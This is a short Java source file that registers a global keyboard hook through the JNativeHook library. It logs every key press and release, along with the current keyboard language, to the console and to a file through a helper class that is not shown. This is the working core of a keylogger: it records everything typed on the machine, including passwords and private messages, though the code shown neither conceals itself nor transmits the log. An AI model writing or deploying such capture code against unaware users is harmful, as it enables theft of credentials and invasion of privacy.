package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener{
	
	private final WriteLogsInToFile writeLogsInToFile = new WriteLogsInToFile();

	public static void main(String[] args) {

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new Main());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		System.out.println("Current language: " + KeyBoardLanguage.keyBoardLanguage());
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
		writeLogsInToFile.addToFile(" " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + " " + "Current language: " + KeyBoardLanguage.keyBoardLanguage());
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
		writeLogsInToFile.addToFile(" " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + " ");
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}

}
